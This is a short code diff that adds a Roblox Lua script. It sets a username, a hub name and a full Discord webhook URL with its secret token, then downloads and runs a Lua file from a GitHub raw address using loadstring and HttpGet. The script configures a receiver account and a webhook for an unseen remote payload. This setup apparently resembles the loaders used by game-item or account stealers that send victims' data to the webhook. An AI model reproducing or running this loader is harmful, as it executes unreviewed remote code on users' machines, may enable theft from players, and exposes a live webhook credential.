@@ -1,0 +1,5 @@
+_G.Username = "b12a235"
+_G.HubName = "script"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1094331920927690803/AO0Fi6l-XJNskkFF_mbu7fhviYFbRirpxiEfrsh8U5NxTE5sJS1PfLicynKTrbovh_g4"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
